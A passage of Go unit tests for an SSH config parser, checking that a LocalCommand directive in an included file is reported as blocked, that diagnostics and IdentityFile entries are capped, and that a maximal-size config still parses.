		".ssh/config":      "Include conf.d/*\n",
		".ssh/conf.d/work": "\n\nHost work\n  LocalCommand echo hi\n",
	})
	diagnostic := requireDiagnostic(t, find(t, result, "work").Diagnostics, LevelBlocked, "LocalCommand")
	if diagnostic.Source != "conf.d/work" || diagnostic.Line != 4 {
		t.Fatalf("diagnostic = %+v", diagnostic)
	}
}

func TestFileDiagnosticsAreBounded(t *testing.T) {
	result, err := ParseText([]byte(strings.Repeat("Include extra\n", maximumDiagnostics+50)))
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Diagnostics) != maximumDiagnostics+1 {
		t.Fatalf("diagnostics = %d", len(result.Diagnostics))
	}
	if last := result.Diagnostics[maximumDiagnostics]; last.Level != LevelInfo || last.Line != 0 {
		t.Fatalf("overflow note = %+v", last)
	}
}

func TestIdentityFileLimit(t *testing.T) {
	var builder strings.Builder
	builder.WriteString("Host target\n")
	for index := range maximumIdentityFiles + 5 {
		fmt.Fprintf(&builder, "  IdentityFile ~/.ssh/key%d\n", index)
	}
	result, err := ParseText([]byte(builder.String()))
	if err != nil {
		t.Fatal(err)
	}
	target := find(t, result, "target")
	if len(target.IdentityFiles) != maximumIdentityFiles {
		t.Fatalf("identity files = %d", len(target.IdentityFiles))
	}
	diagnostic := requireDiagnostic(t, target.Diagnostics, LevelWarning, "IdentityFile")
	if diagnostic.Line != maximumIdentityFiles+2 {
		t.Fatalf("diagnostic = %+v", diagnostic)
	}
}

func TestLargestAcceptedConfigCompletes(t *testing.T) {
	if testing.Short() {
		t.Skip("exercises the size limits")
	}
	var builder strings.Builder
	for index := range maximumCandidates {
		fmt.Fprintf(&builder, "Host h%d\n  ProxyJump h%d\n", index, (index+1)%maximumCandidates)
	}
	builder.WriteString("Host *\n")
	for range maximumEntries - 3*maximumCandidates - 10 {
		builder.WriteString("  IdentityFile ~/.ssh/id\n")
	}
	result, err := ParseText([]byte(builder.String()))
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Candidates) != maximumCandidates {
		t.Fatalf("candidates = %d", len(result.Candidates))
	}
}
